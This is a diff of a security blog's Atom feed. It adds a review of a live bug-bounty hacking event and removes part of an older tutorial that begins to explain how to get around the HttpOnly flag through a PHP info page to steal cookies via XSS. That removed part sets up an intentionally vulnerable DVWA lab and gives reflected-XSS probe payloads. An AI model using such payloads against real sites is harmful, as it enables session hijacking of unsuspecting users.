@@ -1,4 +1,148 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2024-05-03T15:19:26+02:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">VulNyx: Diff3r3ntS3c</title><link href="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/" rel="alternate" type="text/html" title="VulNyx: Diff3r3ntS3c" /><published>2024-04-08T00:00:00+02:00</published><updated>2024-04-08T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://hackcommander.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://hackcommander.github.io/" rel="alternate" type="text/html" /><updated>2024-06-11T00:10:49+02:00</updated><id>https://hackcommander.github.io/feed.xml</id><title type="html">hackcommander.github.io</title><subtitle>This is my personal blog where I talk about science and technology, especially about offensive cybersecurity.</subtitle><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><entry><title type="html">HackerNight 2024: my first live hacking event</title><link href="https://hackcommander.github.io/posts/2024/06/11/hackernight-2024-my-first-live-hacking-event/" rel="alternate" type="text/html" title="HackerNight 2024: my first live hacking event" /><published>2024-06-11T00:00:00+02:00</published><updated>2024-06-11T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2024/06/11/hackernight-2024-my-first-live-hacking-event</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/06/11/hackernight-2024-my-first-live-hacking-event/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. What is HackerNight?&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Why did I sign up for HackerNight?&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. The course of HackerNight&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Entry to the event&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. During the event&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#section-id-3-3&quot;&gt;3.3. Outcome of the event&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Conclusions of HackerNight&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-06-11-hackernight-2024-my-first-live-hacking-event/rooted-hn-logo.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This post does not contain technical details about the vulnerabilities I found in the event because in order to participate in the event I signed a NDA (non-disclosure agreement), so this post is a review about the event and not a technical post about bug bounty.&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In this post I am going to review my experience at the HackerNight live hacking event organized by Yogosha at RootedCON. This was my first live hacking event and against all odds I got the first blood on one of the customers.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-1&quot; /&gt;
+
+&lt;h2 id=&quot;1-what-is-hackernight&quot;&gt;1. What is HackerNight?&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.rootedcon.com/noticias/rooted2024-hackernight/&quot;&gt;HackerNight&lt;/a&gt; is a live hacking event (LHE) for bug bounty hunters organized by &lt;a href=&quot;https://yogosha.com/&quot;&gt;Yogosha&lt;/a&gt; at the &lt;a href=&quot;https://www.rootedcon.com/&quot;&gt;RootedCON&lt;/a&gt; conference in &lt;a href=&quot;https://kinepolis.es/&quot;&gt;Kinepolis&lt;/a&gt;, a cinema in Madrid. This year’s RootedCON Spain took place on March 7 to 9 in Madrid and HackerNight took place during the night of March 8 to 9. In this event bug bounty hunters from different countries gather in person to hack on the programs selected for the event, sharing snacks and experiences.&lt;/p&gt;
+
+&lt;p&gt;To sign up for this event you don’t need to be a pro bounty hunter (I’m not) or have previous bug bounty experience as access to the event is free and anyone can sign up for a cost of 50 euros. You don’t even have to attend the RootedCon congress, because, although the HackerNight is organized in the context of the RootedCON, they are different events. In my case I went to both events because both tickets were paid for by the company I work for, &lt;a href=&quot;https://www.tarlogic.com/&quot;&gt;Tarlogic&lt;/a&gt;. Nobody will be watching you, if you don’t find any bug it’s ok :smiley:&lt;/p&gt;
+
+&lt;p&gt;However, it is one thing to sign up for the event and another to find a valid bug. If you are a beginner hunter I recommend you to go with low expectations in this sense because there are many variables that influence the fact of finding something: scope and age of the programs, quality of the event that year, luck… Of the almost 100 hackers that attended the event, I think only about 15% of the participants got a valid report.&lt;/p&gt;
+
+&lt;p&gt;In my case I found several bugs by chance, as I will explain below. I was very lucky, and if I had not found anything I would not be a worse hunter than I am. In fact the event was attended by many hackers better than me who did not find any bug, and they are still better than me.&lt;/p&gt;
+
+&lt;p&gt;That’s why I recommend that you take the event as a time for leisure and fun with other hackers, rather than as a challenge where failing means you’re a loser. Enjoy the people, the food, the atmosphere, and, above all, the hacking.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2&quot; /&gt;
+
+&lt;h2 id=&quot;2-why-did-i-sign-up-for-hackernight&quot;&gt;2. Why did I sign up for HackerNight?&lt;/h2&gt;
+
+&lt;p&gt;I signed up for this event because it was my third time going to RootedCON and none of the previous years I felt confident enough to sign up. I always thought that maybe I wasn’t ready to participate in this kind of event and besides, I found more interesting the idea of spending the night drinking beer than with a computer :beers:&lt;/p&gt;
+
+&lt;p&gt;However this time I signed up because during the last year I have collaborated with some people who are dedicated to bug bounty but with whom I only talk through Telegram and Discord. So it seemed like a good opportunity to meet many of them face to face.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3&quot; /&gt;
+
+&lt;h2 id=&quot;3-the-course-of-hackernight&quot;&gt;3. The course of HackerNight&lt;/h2&gt;
+
+&lt;div id=&quot;section-id-3-1&quot; /&gt;
+
+&lt;h2 id=&quot;31-entry-to-the-event&quot;&gt;3.1. Entry to the event&lt;/h2&gt;
+
+&lt;p&gt;To be honest, when it was time to enter I didn’t really want to get into the event. I love hacking, but it’s something I do in my spare time at home, and while I had to go to the event, my friends were drinking beer. I had also woken up at 10:00 am to go to the RootedCON talks, I hadn’t taken a nap and I hadn’t had dinner either. I also didn’t have any script ready to do recon because so far all the bug bounty I do is essentially manual. In short, I was tired, hungry and not in the mood to hack :satisfied:. However, it was obvious that I had to go in because I wanted to live the experience.&lt;/p&gt;
+
+&lt;p&gt;The event was supposed to run from 8:00 pm on March 8 to 8:00 am on March 9, that is, 12 hours of hacking. However, due to a delay in the registrations and in the preparation of the event, in the end the event started around 11:00 pm. When I entered I sat at a table with my colleagues of Tarlogic and, although there is no picture of me at the event, I can tell you that I’m the one sitting there on the right:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2024-06-11-hackernight-2024-my-first-live-hacking-event/me.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-2&quot; /&gt;
+
+&lt;h2 id=&quot;32-during-the-event&quot;&gt;3.2. During the event&lt;/h2&gt;
+
+&lt;p&gt;I don’t keep a logbook about the event, but the approximate timeline of the event was:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;11:00 pm:&lt;/strong&gt; start of HackerNight.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;11:00 pm - 1:00 am:&lt;/strong&gt; participating in one of the programs without a defined strategy and without understanding the logic of the application.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;1:00 am - 4:00 am:&lt;/strong&gt; eating pringles and hamburgers and drinking monsters to drown my sorrows because I wasn’t focused and couldn’t find anything :cry:.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;4:00 am - 4:25 am:&lt;/strong&gt; taking a look at the scope of another program, I found a vulnerability by chance.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;4:25 am:&lt;/strong&gt; reported the first vulnerability as &lt;em&gt;Medium&lt;/em&gt;.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;4:42 am:&lt;/strong&gt; the customer accepted the vulnerability as &lt;em&gt;Medium&lt;/em&gt; and my nickname, &lt;em&gt;HackCommander&lt;/em&gt;, appeared on the movie screen in the first bloods section to applause. At that moment, all my accumulated fatigue vanished, and I felt a rush of excitement.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/images/2024-06-11-hackernight-2024-my-first-live-hacking-event/first-blood.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;This picture was taken long after I got the first blood so I had already been kicked off the leaderboard, but I was present for some hours. In fact, I think if they had updated the leaderboard after I was accepted for the &lt;em&gt;High&lt;/em&gt; vulnerability, I might have been in.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;4:42 am - 6:58 am:&lt;/strong&gt; working hard on the same program to test some ideas that came up after the first report.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;6:58 am:&lt;/strong&gt; reported the second vulnerability as &lt;em&gt;Medium&lt;/em&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;7:27 am:&lt;/strong&gt; the customer replied that they were not able to reproduce the bug, and it was true. Due to all the fatigue, I made a mistake in the report.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;7:43 am:&lt;/strong&gt; corrected the error in the report, but the event was about to end.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;8:00 am:&lt;/strong&gt; HackerNight ends with &lt;a href=&quot;https://es.linkedin.com/in/djuradopallares&quot;&gt;Diego Jurado&lt;/a&gt; as the winner.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Therefore, I finished the HackerNight with a &lt;em&gt;Medium&lt;/em&gt; vulnerability accepted and another &lt;em&gt;Medium&lt;/em&gt; pending in triage, completely zombie-like from lack of sleep but full of pride. The battle was over and I was still standing, with traces of blood on my sword.&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/300-rain.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, the best was yet to come. By the end of the event I was absolutely exhausted so I was unable to work, but I knew that the last vulnerability I had reported could be escalated with a little more work. That’s why the following days I continue working on this vulnerability and I managed to escalate it to &lt;em&gt;High&lt;/em&gt;. The customer was very good and accepted the vulnerability with the new impact.&lt;/p&gt;
+
+&lt;p&gt;Being my first live hacking event, I was very excited when my nickname appeared on the screen. I felt that I had achieved another milestone in my career as pentester.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3-3&quot; /&gt;
+
+&lt;h2 id=&quot;33-outcome-of-the-event&quot;&gt;3.3. Outcome of the event&lt;/h2&gt;
+
+&lt;p&gt;In the following Linkedin post you can see how Yogosha published a thank you to customers:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/embed/feed/update/urn:li:ugcPost:7176490844202381313&quot;&gt;Yogosha post on Linkedin about HackerNight 2024&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/2024-06-11-hackernight-2024-my-first-live-hacking-event/linkedin-post.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;They also published a video about the event:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=45b8ykxyY7o&amp;amp;ab_channel=Yogosha&quot;&gt;Yogosha video on Youtube about HackerNight 2024&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this video you can see that in the screen appear the nicknames of many hackers next to the customers where they got the first blood. For example &lt;em&gt;Lobuhi&lt;/em&gt; got the first blood at &lt;em&gt;Arize&lt;/em&gt;, &lt;em&gt;Borgi&lt;/em&gt; at &lt;em&gt;Spartoo&lt;/em&gt;… This is public information published by Yogosha, so I guess I can say that &lt;strong&gt;I got the first blood at Carter Cash&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Finally, the outcome of the event was:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;First blood in the Carter Cash program.&lt;/strong&gt; HackCommander appeared on the Kinepolis screen!&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;A good amount of money for a few hours of work.&lt;/strong&gt; I wish my hourly wage was what I earned that night…&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Direct access to the &lt;a href=&quot;https://yogosha.com/hackers/&quot;&gt;Yogosha Strike Force&lt;/a&gt;.&lt;/strong&gt; To enter this community it is necessary to pass a series of CTFs, but if you report in a LHE a vulnerability of at least &lt;em&gt;Medium&lt;/em&gt; severity, you get a direct access to the community. I just had to write them a ticket because the process is not automatic, and since then I already receive invitations to private programs and I have a public profile as &lt;a href=&quot;https://app.yogosha.com/r/hackcommander&quot;&gt;HackCommander&lt;/a&gt; on Yogosha.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div id=&quot;section-id-3-4&quot; /&gt;
+
+&lt;h2 id=&quot;34-conclusions-of-hackernight&quot;&gt;3.4. Conclusions of HackerNight&lt;/h2&gt;
+
+&lt;p&gt;After all that I have explained, I believe that HackerNight has the following pros and cons:&lt;/p&gt;
+
+&lt;h3 id=&quot;pros&quot;&gt;&lt;u&gt;Pros&lt;/u&gt;:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;The &lt;strong&gt;experience is incredible&lt;/strong&gt;, it’s immersive and unique.&lt;/li&gt;
+  &lt;li&gt;The &lt;strong&gt;price is good&lt;/strong&gt; for everything they offer, even if you don’t win any bounties.&lt;/li&gt;
+  &lt;li&gt;The &lt;strong&gt;people are great&lt;/strong&gt;, they are hackers, just like you.&lt;/li&gt;
+  &lt;li&gt;Yogosha gave away &lt;strong&gt;merchandise and food&lt;/strong&gt; during the night.&lt;/li&gt;
+  &lt;li&gt;It’s &lt;strong&gt;not just a one-night experience&lt;/strong&gt; because if you leave a report unfinished, you can continue working on it in the following days.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;cons&quot;&gt;&lt;u&gt;Cons&lt;/u&gt;:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;It somewhat &lt;strong&gt;disrupts the RootedCON experience&lt;/strong&gt; because you miss the beers that night and possibly the talks during the the day if you’ve been sleeping to be well-rested.&lt;/li&gt;
+  &lt;li&gt;Since it takes place at night, &lt;strong&gt;the schedule is challenging&lt;/strong&gt;, so you either sleep during the day or go more than 24 hours without sleep, as I did.&lt;/li&gt;
+  &lt;li&gt;The &lt;strong&gt;work setup is not comfortable&lt;/strong&gt; because they don’t have monitors for the hackers, so you can only work with your laptop screen.&lt;/li&gt;
+  &lt;li&gt;Other &lt;strong&gt;minor cons related to the programs&lt;/strong&gt;, but which I shouldn’t discuss due to the NDA.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Although some of the cons are fixable, I think &lt;strong&gt;HackerNight is a great event worth attending&lt;/strong&gt; that every bounty hunter should attend at least once in their lifetime. I will probably return next year :blush:.&lt;/p&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="review" /><category term="bug bounty" /><category term="life hacking event" /><category term="hackernight" /><category term="rootedcon" /><category term="yogosha" /><category term="first blood" /><summary type="html">Review of my experience at the HackerNight live hacking event in RootedCON and how I got the first blood on one of the customers.</summary></entry><entry><title type="html">VulNyx: Diff3r3ntS3c</title><link href="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/" rel="alternate" type="text/html" title="VulNyx: Diff3r3ntS3c" /><published>2024-04-08T00:00:00+02:00</published><updated>2024-04-08T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c</id><content type="html" xml:base="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Port and service scanning&lt;/a&gt;&lt;/li&gt;
@@ -2955,393 +3099,4 @@ prompt
   &lt;li&gt;Scan all the company’s domains, do not stop looking for vulnerabilities in a domain because it is well known and you think that all the vulnerabilities are already reported. In this case I discovered an XSS in a well known domain of the company because the XSS was not obvious, it required a bypass, which although it was simple no one had discovered before. So… be humble with your colleagues but be confident, it is fundamental if you want to dedicate yourself seriously to bug bounty.&lt;/li&gt;
   &lt;li&gt;Be aware of the multipliers applied to the programs in which you participate. These multipliers can turn a low hanging fruit into a big banana :banana:.&lt;/li&gt;
   &lt;li&gt;It’s important to keep up to date in the cybersecurity field and read all the researching articles. Today’s discoveries can invalidate yesterday’s security measures.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="utm parameters" /><category term="burpsuite" /><category term="portswigger" /><category term="xss" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing a *302 Security Redirect* due to the presence of Javascript function calls.</summary></entry><entry><title type="html">How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation</title><link href="https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/" rel="alternate" type="text/html" title="How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation" /><published>2022-11-12T00:00:00+01:00</published><updated>2022-11-12T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page</id><content type="html" xml:base="https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Setting up the environment&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Hands-on!&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-2-1&quot;&gt;2.1. Trying to exfiltrate the cookies through the usual method&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-2-2&quot;&gt;2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-2-3&quot;&gt;2.3. Using my Github tool to generate an improved payload&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#section-id-2-4&quot;&gt;2.4. Important notes&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Conclusions&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;PHP info page disclosure is usually considered to be a low severity vulnerability but in this post I am going to show how to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation. This file could be used to perform a session hijacking.&lt;/p&gt;
-
-&lt;p&gt;As far as I know, the person who discovered this bypass technique was &lt;a href=&quot;https://aleksikistauri.medium.com/bypassing-httponly-with-phpinfo-file-4e5a8b17129b&quot;&gt;Aleksi Kistauri&lt;/a&gt; and in this post we are going to see how to reproduce it in Metasploitable 2 with some extra requirements that I have not seen in other posts.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-1&quot; /&gt;
-
-&lt;h2 id=&quot;1-setting-up-the-environment&quot;&gt;1. Setting up the environment&lt;/h2&gt;
-
-&lt;p&gt;We will use the intentionally vulnerable machine &lt;em&gt;Metasploitable 2&lt;/em&gt;. To set up the environment follow the steps below:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;Download the virtual machine from the link below&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/metasploitable-2,29/&quot;&gt;Link to download Metasploitable 2&lt;/a&gt;&lt;/p&gt;
-
-    &lt;p&gt;and import the machine in VMware. If you use VirtualBox, you can do it, the virtualization software is not relevant.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;You should have another virtual machine, preferably a Kali virtual machine.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Set the network adapter of your Kali and &lt;em&gt;Metasploitable 2&lt;/em&gt; as Host-only.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Run &lt;em&gt;Metasploitable 2&lt;/em&gt; and log in using the credentials msfadmin:msfadmin.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Get the IP of the machine through the command ifconfig&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/ifconfig.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Suposing that the IP of the &lt;em&gt;Metasploitable 2&lt;/em&gt; machine is 192.168.240.129 you can access to the web from your Kali through the URL&lt;/p&gt;
-
-    &lt;div class=&quot;code-header&quot;&gt;
-   &lt;button class=&quot;copy-code-button&quot;&gt;
-     Copy
-   &lt;/button&gt;
- &lt;/div&gt;
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; http://192.168.240.129/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;In the main page select the option &lt;em&gt;DVWA&lt;/em&gt;, wich is the acronym of &lt;em&gt;Damn Vulnerable Web Application&lt;/em&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/main-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Log in with the credentials admin:password.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Configure the &lt;em&gt;Security Level&lt;/em&gt; to &lt;em&gt;low&lt;/em&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/dvwa-security.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;and click &lt;em&gt;Submit&lt;/em&gt;.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;In the left panel select the option &lt;em&gt;XSS reflected&lt;/em&gt; and write the payload&lt;/p&gt;
-
-    &lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;in the text box as follows&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-reflected-form.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;and clicking on &lt;em&gt;Submit&lt;/em&gt; you will see an alert like the following&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-reflected-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;So there is an HTML context reflected XSS through GET method in the URL&lt;/p&gt;
-
-    &lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;To show how the PHP info page can be used to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag, we must first have at least one cookie with the &lt;em&gt;HttpOnly&lt;/em&gt; flag set to &lt;em&gt;true&lt;/em&gt;. In &lt;em&gt;Metasploitable 2&lt;/em&gt; is not set by defaul, that’s why we have to access to the cookies in the browser (Firefox in my case) and set, for example, the &lt;em&gt;HttpOnly&lt;/em&gt; of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie to &lt;em&gt;true&lt;/em&gt;, as you can see in the following screenshot&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/cookies-settings.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div id=&quot;section-id-2&quot; /&gt;
-
-&lt;h2 id=&quot;2-hands-on&quot;&gt;2. Hands-on!&lt;/h2&gt;
-
-&lt;div id=&quot;section-id-2-1&quot; /&gt;
-
-&lt;h2 id=&quot;21-trying-to-exfiltrate-the-cookies-through-the-usual-method&quot;&gt;2.1. Trying to exfiltrate the cookies through the usual method&lt;/h2&gt;
-
-&lt;p&gt;A very common way to access the cookies via Javascript is through the &lt;em&gt;document&lt;/em&gt; property &lt;em&gt;cookie&lt;/em&gt;. So if you write the payload&lt;/p&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and you click on &lt;em&gt;Submit&lt;/em&gt;, you are going to see all your cookies in the screen… or not?&lt;/p&gt;
-
-&lt;p&gt;If you make that, you are going to see only the &lt;em&gt;security&lt;/em&gt; cookie, like in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-cookies-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
